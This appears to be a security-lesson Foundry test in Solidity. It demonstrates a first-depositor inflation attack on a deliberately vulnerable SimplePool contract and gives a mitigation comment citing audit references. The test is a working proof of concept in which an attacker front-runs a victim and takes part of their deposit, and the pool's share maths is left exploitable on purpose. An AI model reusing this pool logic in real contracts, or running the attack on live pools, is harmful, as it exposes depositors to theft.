// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
/*

Demo:
First pool depositor can be front-run and have part of their deposit stolen

Mitigation  
Consider minting a minimal amount of pool tokens during the first deposit 
and sending them to zero address, this increases the cost of the attack. 
Uniswap V2 uses the value 1000 as it is small enough to don't hurt the first minter, 
while still increasing the cost of this attack by 1000x.

REF:
https://defihacklabs.substack.com/p/solidity-security-lesson-2-first
https://github.com/sherlock-audit/2023-02-surge-judging/issues/1
https://github.com/transmissions11/solmate/issues/178
*/

contract ContractTest is Test {
        SimplePool SimplePoolContract;
        MyToken MyTokenContract;
 
function setUp() public { 

        MyTokenContract = new MyToken();
        SimplePoolContract = new SimplePool(address(MyTokenContract));

    }

function testFirstDeposit() public {

    address alice = vm.addr(1);
    address bob = vm.addr(2);
    MyTokenContract.transfer(alice, 1 ether + 1);
    MyTokenContract.transfer(bob, 2 ether);

    vm.startPrank(alice);
    // Alice deposits 1 wei, gets 1 pool token
    MyTokenContract.approve(address(SimplePoolContract), 1);
    SimplePoolContract.deposit(1);

    // Alice transfers 1 ether to the pool, inflating the pool token price
    MyTokenContract.transfer(address(SimplePoolContract), 1 ether);

    vm.stopPrank();
    vm.startPrank(bob);
    // Bob deposits 2 ether, gets 1 pool token due to inflated price
    MyTokenContract.approve(address(SimplePoolContract), 2 ether);
    SimplePoolContract.deposit(2 ether);
    vm.stopPrank();
    vm.startPrank(alice);
    console.log("totalShares", SimplePoolContract.totalShares() );
    MyTokenContract.balanceOf(address(SimplePoolContract));

    // Alice withdraws and gets 1.5 ether, making a profit
    SimplePoolContract.withdraw(1);
    assertEq(MyTokenContract.balanceOf(alice), 1.5 ether);

    }

    receive() payable external{}
}


contract MyToken is ERC20, Ownable {
    constructor() ERC20("MyToken", "MTK") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}
contract SimplePool {
    IERC20 public loanToken;
    uint public totalShares;

    mapping(address => uint) public balanceOf;

    constructor(address _loanToken) {
        loanToken = IERC20(_loanToken);
    }

    function deposit(uint amount) external {
        require(amount > 0, "Amount must be greater than zero");

        uint _shares;
        if (totalShares == 0) {
            _shares = amount;
        } else {
            _shares = tokenToShares(amount, loanToken.balanceOf(address(this)), totalShares, false);
        } 
        
        require(loanToken.transferFrom(msg.sender, address(this), amount), "TransferFrom failed");
        balanceOf[msg.sender] += _shares;
        totalShares += _shares;
    }

    function tokenToShares(uint _tokenAmount, uint _supplied, uint _sharesTotalSupply, bool roundUpCheck) internal pure returns (uint) {
        if (_supplied == 0) return _tokenAmount;
        uint shares = _tokenAmount * _sharesTotalSupply / _supplied;
        if (roundUpCheck && shares * _supplied < _tokenAmount * _sharesTotalSupply) shares++;
        return shares;
    }

    function withdraw(uint shares) external {
        require(shares > 0, "Shares must be greater than zero");
        require(balanceOf[msg.sender] >= shares, "Insufficient balance");

        uint tokenAmount = (shares * loanToken.balanceOf(address(this))) / totalShares;

        balanceOf[msg.sender] -= shares;
        totalShares -= shares;

        require(loanToken.transfer(msg.sender, tokenAmount), "Transfer failed");
    }
}
